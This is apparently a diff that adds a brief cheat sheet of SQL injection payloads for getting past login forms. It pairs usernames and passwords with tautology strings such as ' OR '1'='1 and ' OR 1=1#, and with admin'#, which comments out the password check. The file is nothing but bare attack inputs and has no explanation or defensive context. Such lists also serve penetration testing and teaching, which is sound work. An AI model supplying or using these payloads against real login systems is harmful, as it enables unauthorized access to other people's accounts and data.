@@ -1,0 +1,8 @@
+(Username: anything)
+Password: 
+' OR '1'='1
+' OR 1=1#
+' OR 'x'='x
+-----------------------------
+Username:admin'#
+Password:anything
